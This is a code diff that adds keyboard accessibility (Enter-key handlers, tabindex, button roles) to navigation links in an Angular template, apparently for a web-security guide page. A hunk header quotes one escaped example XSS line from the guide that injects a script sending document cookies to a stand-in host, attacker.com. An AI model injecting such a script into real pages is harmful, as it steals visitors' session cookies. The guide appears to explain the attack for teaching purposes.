@@ -20,6 +20,9 @@
             class="guide-nav__link"
             [class.active]="activeSection() === link.id"
             (click)="scrollTo(link.id)"
+            (keydown.enter)="scrollTo(link.id)"
+            tabindex="0"
+            role="button"
           >
             <span class="guide-nav__link-icon">{{ link.icon }}</span>
             <span>{{ link.label }}</span>
@@ -2150,7 +2153,7 @@ Inject: &lt;script&gt;fetch(&#x27;https://attacker.com/steal?c=&#x27;+document.c
 
   <!-- Back to top -->
   <div class="back-to-top">
-    <a (click)="scrollTo('overview')" class="back-to-top__link">&#x2191; Back to Top</a>
+    <a (click)="scrollTo('overview')" (keydown.enter)="scrollTo('overview')" tabindex="0" role="button" class="back-to-top__link">&#x2191; Back to Top</a>
   </div>
 
 </main>
